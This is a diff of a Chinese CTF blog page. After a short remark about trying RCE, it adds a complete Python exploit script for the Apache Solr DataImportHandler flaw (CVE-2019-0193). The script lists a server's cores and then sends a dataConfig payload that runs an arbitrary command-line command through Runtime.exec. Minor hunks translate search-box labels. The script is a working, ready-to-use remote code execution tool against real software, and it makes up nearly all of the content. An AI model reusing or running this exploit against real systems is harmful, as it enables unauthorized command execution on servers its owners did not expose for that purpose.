@@ -392,6 +392,98 @@ Connection: close
 <p>但是。。这XXE读不出来/proc/self/environ</p>
 <p>刷Buu没flag玩个锤子。</p>
 <p>继续试RCE:</p>
+<pre><code class="py">import requests
+import json
+import sys
+
+
+banner = &#39;&#39;&#39;
+   _______      ________    ___   ___  __  ___          ___  __  ___ ____  
+  / ____\ \    / /  ____|  |__ \ / _ \/_ |/ _ \        / _ \/_ |/ _ \___ \ 
+ | |     \ \  / /| |__ ______ ) | | | || | (_) |______| | | || | (_) |__) |
+ | |      \ \/ / |  __|______/ /| | | || |\__, |______| | | || |\__, |__ &lt; 
+ | |____   \  /  | |____    / /_| |_| || |  / /       | |_| || |  / /___) |
+  \_____|   \/   |______|  |____|\___/ |_| /_/         \___/ |_| /_/|____/ 
+
+                          python By jas502n                                              
+
+&#39;&#39;&#39;
+print banner
+
+def admin_cores(url, cmd):
+    core_selector_url = url + &#39;/solr/admin/cores?_=1565526689592&amp;indexInfo=false&amp;wt=json&#39;
+    r = requests.get(url=core_selector_url)
+    json_strs = json.loads(r.text)
+    if r.status_code ==200 and &quot;responseHeader&quot; in r.text:
+        print &quot;\nHere Have %s Core_name Exit!\n&quot; % str(len(json_strs[&#39;status&#39;]))
+        for core_selector in json_strs[&#39;status&#39;]:
+            jas502n_Core_Name = json_strs[&#39;status&#39;][&#39;%s&#39;%core_selector][&#39;name&#39;]
+            print &#39;\n&gt;&gt;&gt;&gt;The Core Name = %s&#39; % jas502n_Core_Name
+            show_config(url,jas502n_Core_Name)
+            get_config_name(url,jas502n_Core_Name)
+            URLDataSource_Poc(url,jas502n_Core_Name,cmd)
+
+    else:
+        print &quot;No core_selector Exit!&quot;
+
+
+
+
+def show_config(url,jas502n_Core_Name):
+    config_url = url + &quot;/solr/&quot;+ jas502n_Core_Name +&quot;/dataimport?_=1565530241159&amp;command=show-config&amp;indent=on&amp;wt=json&quot;
+    r1 = requests.get(config_url)
+
+    if r1.status_code ==200 and &#39;dataConfig&#39; in r1.text:
+        print &quot;&gt;&gt; config_url= %s&quot;% config_url
+        print &quot;&gt;%s dataConfig Exit!&quot; % jas502n_Core_Name
+    else:
+        print &quot;dataConfig No Exit!&quot;
+
+
+
+def get_config_name(url,jas502n_Core_Name):
+    get_config_url = url + &#39;/solr/&#39;+ jas502n_Core_Name +&#39;/dataimport?_=1565530241159&amp;command=status&amp;indent=on&amp;wt=json&#39;
+    r2 = requests.get(get_config_url)
+    if r2.status_code ==200 and &#39;config&#39; in r2.text:
+        print &quot;&gt;&gt; get_config_url= %s&quot; % get_config_url
+        r2_json = json.loads(r2.text)
+        r2_str = r2_json[&#39;initArgs&#39;]
+
+        print &#39;&gt;get_config_name= %s&#39; % r2_str[1][1]
+
+    else:
+        print &quot;Core Config Name No Exit!&quot;
+
+
+
+def URLDataSource_Poc(url,jas502n_Core_Name,cmd):
+    debug_model_url = url + &#39;/solr/&#39;+ jas502n_Core_Name +&#39;/dataimport?_=1565530241159&amp;indent=on&amp;wt=json&#39;
+    payload = &quot;command=full-import&amp;verbose=false&amp;clean=true&amp;commit=true&amp;debug=true&amp;core=atom&amp;dataConfig=%%3CdataConfig%%3E%%0A++%%3CdataSource+type%%3D%%22URLDataSource%%22%%2F%%3E%%0A++%%3Cscript%%3E%%3C!%%5BCDATA%%5B%%0A++++++++++function+poc()%%7B+java.lang.Runtime.getRuntime().exec(%%22%s%%22)%%3B%%0A++++++++++%%7D%%0A++%%5D%%5D%%3E%%3C%%2Fscript%%3E%%0A++%%3Cdocument%%3E%%0A++++%%3Centity+name%%3D%%22stackoverflow%%22%%0A++++++++++++url%%3D%%22https%%3A%%2F%%2Fstackoverflow.com%%2Ffeeds%%2Ftag%%2Fsolr%%22%%0A++++++++++++processor%%3D%%22XPathEntityProcessor%%22%%0A++++++++++++forEach%%3D%%22%%2Ffeed%%22%%0A++++++++++++transformer%%3D%%22script%%3Apoc%%22+%%2F%%3E%%0A++%%3C%%2Fdocument%%3E%%0A%%3C%%2FdataConfig%%3E&amp;name=dataimport&quot; % cmd
+    headers = {
+    &quot;User-Agent&quot;:&quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:55.0) Gecko/20100101 Firefox/55.0&quot;,
+    &quot;Accept&quot;: &quot;application/json, text/plain, */*&quot;,
+    &quot;Accept-Language&quot;:&quot;zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3&quot;,
+    &quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,
+    &quot;Content-type&quot;:&quot;application/x-www-form-urlencoded&quot;,
+    &quot;X-Requested-With&quot;:&quot;XMLHttpRequest&quot;,
+    &quot;Referer&quot;:&quot;http://%s/solr/&quot; % url
+
+    }
+    r3 = requests.post(url = debug_model_url, data=payload,headers=headers)
+    print &quot;&gt;&gt;&gt;&gt;&gt; debug_model_url= %s&quot; % debug_model_url
+    if r3.status_code ==200 and &#39;Requests&#39; in r3.text:
+
+        print &quot;Send Poc Success!&quot;
+    else:
+        print &quot;No Send Poc Success!&quot;
+        print r3.text
+
+
+
+if __name__ == &#39;__main__&#39;:
+    cmd = sys.argv[2]
+    url = sys.argv[1]
+    admin_cores(url,cmd)</code></pre>
 
         </div>
         <!-- .entry-content -->
@@ -495,7 +587,7 @@ Connection: close
     <div class="ins-search-mask"></div>
     <div class="ins-search-container">
         <div class="ins-input-wrapper">
-            <input type="text" class="ins-search-input" placeholder="Type something..."/>
+            <input type="text" class="ins-search-input" placeholder="请输入关键词..."/>
             <span class="ins-close ins-selectable"><i class="fa fa-times-circle"></i></span>
         </div>
         <div class="ins-section-wrapper">
@@ -507,10 +599,10 @@ Connection: close
 (function (window) {
     var INSIGHT_CONFIG = {
         TRANSLATION: {
-            POSTS: 'Posts',
-            // PAGES: 'Pages',
-            CATEGORIES: 'Categories',
-            TAGS: 'Tags',
+            POSTS: '文章',
+            // PAGES: '页面',
+            CATEGORIES: '分类',
+            TAGS: '标签',
         },
         ROOT_URL: '/',
         CONTENT_URL: '/content.json',
